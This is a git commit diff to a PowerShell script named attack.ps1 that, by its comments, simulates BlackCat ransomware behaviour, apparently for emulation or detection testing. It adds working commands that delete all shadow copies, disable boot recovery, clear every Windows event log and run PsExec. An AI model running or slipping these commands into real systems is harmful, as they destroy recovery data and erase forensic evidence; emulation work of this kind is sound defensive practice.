426f31938cf5519d9bcde6b661fbc791acba5291
chromatic-wolf <53034260+CHROME-PLATED-METRO-WOLF@users.noreply.github.com>
2023-09-23 18:18:19 +1000

    added commands
    added commands to attack script and added a menu to select from

--- shared-folder/attack.ps1
+++ shared-folder/attack.ps1
@@ -1,4 +1,4 @@
-function attack1()
+function dissableSystemRecovery()
 {
 #dissables system recovery methods
 vssadmin.exe delete shadows /all /quiet
@@ -6,18 +6,26 @@ wmic.exe Shadowcopy Delete
 bcdedit /set {default} recoveryenabled No
 }
 
-function attack2()
+function clearLogs()
 {
-
+#loops through all event logs and deletes them
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
 }
 
-function attack3()
+function netUse()
 {
-
+#simulates using the net use command with persistence turned off
+net use /persistent:no
 }
 
-function attack4()
+function psExec()
 {
-
+#runns the psexec command with -accepteula to simulate blackcat
+.\PSTools\psexec.exe -accepteula
 }
 
+Write-Output "Please select a option"
+Write-Output "1: dissable system recovery"
+Write-Output "2: clear event logs"
+Write-Output "3: run psExec"
+Write-Output "exit: exit script"
